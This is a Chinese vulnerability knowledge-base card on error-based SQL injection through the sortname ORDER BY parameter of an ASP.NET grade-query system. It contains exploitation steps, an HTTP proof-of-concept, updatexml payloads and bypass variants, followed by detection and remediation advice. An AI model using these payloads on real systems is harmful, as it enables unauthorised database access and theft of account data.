---
id: web-generic-sqli-aspnet-sortname-orderby-updatexml
title: ASP.NET 成绩查询 sortname 排序参数 ORDER BY 报错注入：updatexml 经 XML 响应带出库名
type: scenario
domain: web
path: web/generic/sqli
technique: aspnet-sortname-orderby-updatexml
tags:
- sqli
- mysql
- aspnet
- iis
- order-by
- error-based
- updatexml
- education
- sports-meet
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-V273
  verified_at: '2026-11-08T00:06:52+08:00'
  notes: 已对照全文与 27 图核对：图 11 sortname=1s 返回 Unknown column '1s' in 'order clause'；图 16 updatexml(1,0x7e) 返回 Incorrect parameter count；图 18 concat(0x7e,exp(1)) 返回 XPATH syntax error '~2.718...'；图 19 concat(0x7e,database(),1) 返回 '~wls_master'；响应头 IIS/10.0、X-AspNet-Version 4.0.30319 均一致。已修正卡片与 staging 草稿中误写的 updatexml(1,0x7e,1)（3 参数不会触发参数个数错误）为原文实际使用的 updatexml(1,0x7e) 两参数，随后 verify 通过。未验证点：原文仅注出库名，未继续列表/取数。dedup top1 为自身；OA orderBy、MCMS orderBy 为不同产品/参数链，保留。
url: /docs/web/generic/sqli/web-generic-sqli-aspnet-sortname-orderby-updatexml/
draft: false
kb_aliases:
- sortname 排序注入
- sortorder 参数注入
- 成绩查询 ORDER BY 注入
- ASP.NET XML 错误回显注入
- updatexml 报错注入 教育系统
- 运动会编排系统 SQL 注入
---

## 一句话结论

ASP.NET 成绩查询接口把排序参数 `sortname` 直接拼进 `ORDER BY`，未做白名单；用 MySQL `updatexml()` 的非法 XPath 触发错误后，数据库错误经 XML 响应的 `<exc>` 节点原样回显，可带出当前数据库名等数据。

## 原理

- 查询成绩列表的请求形如 `sortname=hm&sortorder=asc`，后端把 `sortname` 直接拼进 `ORDER BY <sortname> <sortorder>`，没有使用标识符白名单或参数化。
- `ORDER BY` 位置不能直接 `UNION`，但 MySQL 的 `updatexml(xml_doc, xpath, new_xml)` 在 XPath 非法时会把非法 XPath 的内容写进错误信息；把 `concat(0x7e, database(), 0x7e)` 作为第二参数，库名就出现在错误里。
- 应用把数据库异常包装成 XML 返回：`<DataList><exc>XPATH syntax error: '~wls_master'</exc></DataList>`，错误直接回显给客户端，形成带内报错注入。
- `sortname` 的正常值看似普通（如 `hm`），但服务端没有类型/白名单校验；先传 `1s` 得到 `Unknown column '1s' in 'order clause'` 即可证明拼接点存在，再换成报错函数。
- 响应头为 `Microsoft-IIS/10.0`、`X-AspNet-Version: 4.0.30319`、`X-Powered-By: ASP.NET`，可据此确认服务端栈并选择 MySQL 报错函数；错误文案（`Incorrect parameter count in the call to native function 'updatexml'`、`XPATH syntax error`）也可辅助确认函数可用性。

## 触发条件

- 目标为使用该查询成绩功能的 ASP.NET 应用，`sortname`/`sortorder` 参数可控且被拼入 `ORDER BY`。
- 数据库为 MySQL 5.1+，当前数据库用户可执行 `updatexml`。
- 应用将数据库异常回显到响应（本例为 XML `<exc>` 节点）。
- 攻击者已能访问查询成绩页面（本例在默认口令登录后）。

## 利用步骤

1. 在查询成绩页面抓包，找到携带 `sortname`/`sortorder` 的请求。
2. 传 `sortname=1s`，观察是否返回 `Unknown column '1s' in 'order clause'`，确认参数进入 `ORDER BY`。
3. 传 `sortname=updatexml(1,0x7e)`（仅 2 个参数）观察参数个数错误，确认 `updatexml` 被调用且错误可回显。
4. 传 `sortname=updatexml(1,concat(0x7e,database(),0x7e),1)`，从错误信息读取当前库名。
5. 用 `concat(0x7e,(select ...),0x7e)` 与 `substr` 分段提取表名、列名、账号哈希等（错误信息长度有限，约 32 字符）。
6. 若 `updatexml` 被过滤，改用 `extractvalue`、`floor(rand()*2)` 或时间盲注。

## PoC

```http
POST /queryScore.ashx HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Cookie: <登录会话>

sortname=updatexml(1,concat(0x7e,database(),0x7e),1)&sortorder=asc
```

响应示例：

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes'?><rss version='2.0'><DataList><exc>XPATH syntax error: '~wls_master'</exc></DataList></rss>
```

```text
# 探路 payload 与对应错误：
# sortname=1s
#   -> Unknown column '1s' in 'order clause'
# sortname=updatexml(1,0x7e)
#   -> Incorrect parameter count in the call to native function 'updatexml'
# sortname=updatexml(1,concat(0x7e,database(),0x7e),1)
#   -> XPATH syntax error: '~<database>'
```

## 变体与关联

- 变体：`sortorder` 也可能被拼接；只校验 `sortname` 而漏掉 `sortorder` 时同样可注入。
- 变体：报错函数被拦时用 `extractvalue`、`floor`、`exp` 或时间盲注；无回显时转布尔/时间盲注。
- 关联：[[web-generic-sqli-error-based-extraction]]（updatexml/extractvalue 报错注入通用手法）、[[web-generic-sqli-oa-jsp-orderby-sort-updatexml]]（另一产品的 ORDER BY updatexml 注入）、[[web-generic-sqli-java-identifier-table-order-by-injection]]（标识符位置无法预编译）、[[web-generic-sqli-bootdo-sort-order-token]]（sort/order 参数注入）。
- 边界：`sortname` 走固定白名单映射、`ORDER BY` 使用参数化、或数据库错误不回显时，本路径需改用盲注/带外或失效。

## 检测与防御

- 检测：`sortname`/`sortorder` 含 `updatexml`、`extractvalue`、`sleep`、`if(`、`select`、括号、逗号等特征；响应出现 `XPATH syntax error`、`Unknown column`、`Incorrect parameter count`；同一接口短时间大量不同排序值。
- 修复：排序字段与方向使用固定白名单映射，禁止拼接；数据库异常统一捕获，不向前端返回原始错误。
- 加固：数据库账号最小权限；WAF 拦截报错函数与异常排序参数；审计异常排序请求与 SQL 错误日志。
